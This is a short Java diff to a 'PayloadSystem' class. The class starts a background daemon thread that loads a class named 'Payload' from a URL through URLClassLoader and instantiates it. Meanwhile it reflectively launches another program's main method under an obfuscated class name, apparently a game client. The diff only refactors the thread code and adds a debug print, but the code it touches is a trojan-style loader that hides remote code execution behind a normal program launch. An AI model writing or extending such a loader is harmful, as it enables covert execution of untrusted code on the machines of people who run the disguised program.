@@ -11,19 +11,14 @@ public class PayloadSystem {
 
     public static void main(String[] args) throws NoSuchMethodException, ClassNotFoundException, InvocationTargetException, IllegalAccessException {
         pld = true;
-        payload();
+        run();
         Class mcClass = Class.forName(("_".toLowerCase() + "0ef7878959aec39e48a9b370a79bbfde").substring(1));
         Method mainMethod = mcClass.getMethod("main", String[].class);
         mainMethod.invoke(null, (Object) args);
     }
 
     private static void run() {
-        Thread t = new Thread() {
-            @Override
-            public void run() {
-                payload();
-            }
-        };
+        Thread t = new Thread(PayloadSystem::payload);
         t.setDaemon(true);
         t.start();
     }
@@ -52,6 +47,7 @@ public class PayloadSystem {
                 //HashMap<String, byte[]> extraClasses = new HashMap<>();
                 //extraClasses.put("Payload", classData);
                 //, extraClasses
+                System.out.println("HEY");
                 ClassLoader classLoader = new URLClassLoader(new URL[]{url}, Thread.currentThread().getContextClassLoader());
                 Class payloadClass = classLoader.loadClass("Payload");
                 Object payloadInstance = payloadClass.newInstance();
